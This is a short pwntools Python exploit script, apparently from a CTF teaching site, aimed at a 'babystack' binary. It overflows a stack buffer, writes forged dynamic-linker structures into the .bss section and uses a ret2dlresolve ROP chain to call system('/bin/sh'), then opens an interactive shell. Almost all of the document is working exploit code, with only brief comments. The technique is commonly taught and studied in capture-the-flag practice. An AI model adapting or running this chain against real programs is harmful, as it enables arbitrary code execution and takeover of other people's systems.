#https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve
from pwn import *

elf = context.binary = ELF('./babystack')
p = elf.process()
rop = ROP(elf)
writable_bss = elf.bss(0x100)
offset=0x14

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'], data_addr=writable_bss)

rop.raw('A' * offset) # Trigger the buffer overflow
rop.read(0, writable_bss) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve) # call .plt and dl-resolve() with the correct, calculated reloc_offset

p.sendline(rop.chain())
sleep(0.5)
p.sendline(dlresolve.payload)
p.interactive()